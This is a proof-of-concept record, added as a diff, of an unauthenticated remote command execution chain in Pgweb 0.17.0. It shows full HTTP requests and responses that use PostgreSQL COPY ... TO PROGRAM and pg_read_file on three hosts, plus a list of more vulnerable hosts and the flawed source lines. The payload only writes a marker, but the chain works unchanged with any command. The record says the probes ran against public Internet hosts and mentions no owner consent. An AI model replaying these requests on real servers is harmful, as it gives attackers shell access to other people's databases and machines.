@@ -1,0 +1,219 @@
+================================================================================
+Pgweb (sosedoff/pgweb) unauthenticated SQL access and OS command execution PoC
+Endpoints: GET /api/info -> GET /api/query?query=<SQL>
+Collection date: 2026-10-20    Environment: public Internet hosts
+# Public host identities are redacted; 192.0.2.x addresses are placeholders.
+================================================================================
+Notes:
+- Pgweb does not enable HTTP authentication unless configured; /api/query
+  accepts SQL from unauthenticated visitors when the service is exposed.
+- With a superuser database connection, PostgreSQL COPY ... TO PROGRAM can
+  invoke /bin/sh as the database service process user (postgres in the container).
+- The probe used four steps per host: write marker -> read back -> remove ->
+  verify removal. A separate SQL query checked the connected role first.
+- The probe wrote only the fixed string NCCPROBE to /tmp/ncc_pg_probe. It did
+  not install a web shell, create a reverse shell, read other files, or modify
+  application data. Removal was verified on all three hosts.
+- Public target addresses below have been replaced with reserved documentation
+  addresses (192.0.2.0/24). Database identifiers have been fully redacted.
+  Status codes, SQL, marker output, and other non-identifying evidence remain.
+
+
+Case 1: http://192.0.2.1:8081 -- Pgweb 0.17.0, PostgreSQL 16.15
+
+--- 1) Confirm unauthenticated SQL access and superuser role ---
+GET /api/query?query=select%20current_user%2C%20current_database%28%29%2C%20%28select%20rolsuper%20from%20pg_roles%20where%20rolname%3Dcurrent_user%29%20as%20is_superuser HTTP/1.1
+Host: 192.0.2.1:8081
+Connection: close
+
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+
+{"columns":["current_user","current_database","is_superuser"],
+ "rows":[["postgres","REDACTED_DB",true]]}
+
+--- 2) Write marker: execute a command and create the file ---
+GET /api/query?query=COPY%20%28SELECT%20%27NCCPROBE%27%29%20TO%20PROGRAM%20%27cat%20%3E%20/tmp/ncc_pg_probe%27 HTTP/1.1
+Host: 192.0.2.1:8081
+Connection: close
+
+HTTP/1.1 200 OK
+
+{"columns":[],"rows":[],"stats":{"columns_count":0,"rows_count":0,
+ "query_start_time":"2026-10-20T10:10:11.363957974Z",
+ "query_finish_time":"2026-10-20T10:10:11.376480905Z","query_duration_ms":12}}
+
+--- 3) Read marker back to verify execution ---
+GET /api/query?query=SELECT%20pg_read_file%28%27/tmp/ncc_pg_probe%27%29 HTTP/1.1
+Host: 192.0.2.1:8081
+Connection: close
+
+HTTP/1.1 200 OK
+
+{"columns":["pg_read_file"],"rows":[["NCCPROBE\n"]],"stats":{"columns_count":1,
+ "rows_count":1,"query_duration_ms":1}}
+
+--- 4) Remove marker ---
+GET /api/query?query=COPY%20%28SELECT%20%27%27%29%20TO%20PROGRAM%20%27rm%20-f%20/tmp/ncc_pg_probe%27 HTTP/1.1
+Host: 192.0.2.1:8081
+Connection: close
+
+HTTP/1.1 200 OK
+
+{"columns":[],"rows":[],"stats":{"columns_count":0,"rows_count":0,
+ "query_duration_ms":8}}
+
+--- 5) Verify marker removal ---
+GET /api/query?query=SELECT%20pg_read_file%28%27/tmp/ncc_pg_probe%27%29 HTTP/1.1
+Host: 192.0.2.1:8081
+Connection: close
+
+HTTP/1.1 400 Bad Request
+
+{"error":"pq: could not open file \"/tmp/ncc_pg_probe\" for reading:
+ No such file or directory","status":400}
+
+Conclusion: The command executed through unauthenticated access; NCCPROBE was
+read back, and marker removal was verified.
+
+
+Case 2: http://192.0.2.2:8081 -- Pgweb 0.17.0, PostgreSQL 16.14
+
+--- 1) Confirm database role ---
+GET /api/query?query=select%20current_user%2C%20current_database%28%29%2C%20%28select%20rolsuper%20from%20pg_roles%20where%20rolname%3Dcurrent_user%29%20as%20is_superuser HTTP/1.1
+Host: 192.0.2.2:8081
+Connection: close
+
+HTTP/1.1 200 OK
+
+{"columns":["current_user","current_database","is_superuser"],
+ "rows":[["postgres","REDACTED_DB",true]]}
+
+--- 2) Write marker ---
+GET /api/query?query=COPY%20%28SELECT%20%27NCCPROBE%27%29%20TO%20PROGRAM%20%27cat%20%3E%20/tmp/ncc_pg_probe%27 HTTP/1.1
+Host: 192.0.2.2:8081
+Connection: close
+
+HTTP/1.1 200 OK
+
+{"columns":[],"rows":[],"stats":{"columns_count":0,"rows_count":0,
+ "query_start_time":"2026-10-20T10:10:12.869021935Z",
+ "query_finish_time":"2026-10-20T10:10:12.899438303Z","query_duration_ms":30}}
+
+--- 3) Read marker back ---
+GET /api/query?query=SELECT%20pg_read_file%28%27/tmp/ncc_pg_probe%27%29 HTTP/1.1
+Host: 192.0.2.2:8081
+Connection: close
+
+HTTP/1.1 200 OK
+
+{"columns":["pg_read_file"],"rows":[["NCCPROBE\n"]],"stats":{"columns_count":1,
+ "rows_count":1,"query_duration_ms":9}}
+
+--- 4) Remove marker ---
+GET /api/query?query=COPY%20%28SELECT%20%27%27%29%20TO%20PROGRAM%20%27rm%20-f%20/tmp/ncc_pg_probe%27 HTTP/1.1
+Host: 192.0.2.2:8081
+Connection: close
+
+HTTP/1.1 200 OK
+
+{"columns":[],"rows":[],"stats":{"columns_count":0,"rows_count":0,
+ "query_duration_ms":10}}
+
+--- 5) Verify marker removal (one retry after a timeout on the same read) ---
+GET /api/query?query=SELECT%20pg_read_file%28%27/tmp/ncc_pg_probe%27%29 HTTP/1.1
+Host: 192.0.2.2:8081
+Connection: close
+
+HTTP/1.1 400 Bad Request
+
+{"error":"pq: could not open file \"/tmp/ncc_pg_probe\" for reading:
+ No such file or directory","status":400}
+
+Conclusion: The command executed through unauthenticated access; NCCPROBE was
+read back, and marker removal was verified.
+
+
+Case 3: http://192.0.2.3:8081 -- Pgweb 0.17.0, PostgreSQL 18.1
+
+--- 1) Confirm database role ---
+GET /api/query?query=select%20current_user%2C%20current_database%28%29%2C%20%28select%20rolsuper%20from%20pg_roles%20where%20rolname%3Dcurrent_user%29%20as%20is_superuser HTTP/1.1
+Host: 192.0.2.3:8081
+Connection: close
+
+HTTP/1.1 200 OK
+
+{"columns":["current_user","current_database","is_superuser"],
+ "rows":[["postgres","REDACTED_DB",true]]}
+
+--- 2) Write marker ---
+GET /api/query?query=COPY%20%28SELECT%20%27NCCPROBE%27%29%20TO%20PROGRAM%20%27cat%20%3E%20/tmp/ncc_pg_probe%27 HTTP/1.1
+Host: 192.0.2.3:8081
+Connection: close
+
+HTTP/1.1 200 OK
+
+{"columns":[],"rows":[],"stats":{"columns_count":0,"rows_count":0,
+ "query_start_time":"2026-10-20T10:10:15.598493274Z",
+ "query_finish_time":"2026-10-20T10:10:15.630936862Z","query_duration_ms":32}}
+
+--- 3) Read marker back ---
+GET /api/query?query=SELECT%20pg_read_file%28%27/tmp/ncc_pg_probe%27%29 HTTP/1.1
+Host: 192.0.2.3:8081
+Connection: close
+
+HTTP/1.1 200 OK
+
+{"columns":["pg_read_file"],"rows":[["NCCPROBE\n"]],"stats":{"columns_count":1,
+ "rows_count":1,"query_duration_ms":1}}
+
+--- 4) Remove marker ---
+GET /api/query?query=COPY%20%28SELECT%20%27%27%29%20TO%20PROGRAM%20%27rm%20-f%20/tmp/ncc_pg_probe%27 HTTP/1.1
+Host: 192.0.2.3:8081
+Connection: close
+
+HTTP/1.1 200 OK
+
+{"columns":[],"rows":[],"stats":{"columns_count":0,"rows_count":0,
+ "query_duration_ms":2}}
+
+--- 5) Verify marker removal ---
+GET /api/query?query=SELECT%20pg_read_file%28%27/tmp/ncc_pg_probe%27%29 HTTP/1.1
+Host: 192.0.2.3:8081
+Connection: close
+
+HTTP/1.1 400 Bad Request
+
+{"error":"pq: could not open file \"/tmp/ncc_pg_probe\" for reading:
+ No such file or directory","status":400}
+
+Conclusion: The command executed through unauthenticated access; NCCPROBE was
+read back, and marker removal was verified.
+
+
+================================================================================
+Other observed hosts (distinct IPs classified VULN by the source scan;
+unauthenticated SQL access was observed, but OS commands were not demonstrated)
+================================================================================
+# http://192.0.2.4:1111     postgres@REDACTED_DB   PostgreSQL 15.15
+# http://192.0.2.5:8081      postgres@REDACTED_DB   PostgreSQL 15.3
+# http://192.0.2.6:8002       postgres@REDACTED_DB   PostgreSQL 15.18
+# http://192.0.2.7:6082        postgres@REDACTED_DB   PostgreSQL 18.6
+# http://192.0.2.8:8082      postgres@REDACTED_DB   PostgreSQL 17.11
+# http://192.0.2.9:8081      postgres@REDACTED_DB   PostgreSQL 17.4
+# http://192.0.2.10:8081        postgres@REDACTED_DB   PostgreSQL 16.14
+
+
+================================================================================
+Conditions and source locations (Pgweb 0.17.0, commit 6b0b0244)
+================================================================================
+- HTTP layer: cli.go:202-206 attaches gin.BasicAuth only when AuthUser and
+  AuthPass are both nonempty. Neither option has a default in options.go:44-45.
+  Dockerfile:48 starts with --bind=0.0.0.0 --listen=8081.
+- SQL layer: api.go:312,556 passes RunQuery -> HandleQuery -> client.Query
+  without restricting the SQL statement type.
+- Database layer: The connected role was a superuser in these cases. PostgreSQL
+  also allows COPY ... TO PROGRAM for roles with pg_execute_server_program.
+  Common docker-compose deployments may connect using the postgres superuser.
+- Observed chain: unauthenticated /api/query -> COPY ... TO PROGRAM -> OS command
+  as the database process user -> output read back via pg_read_file.
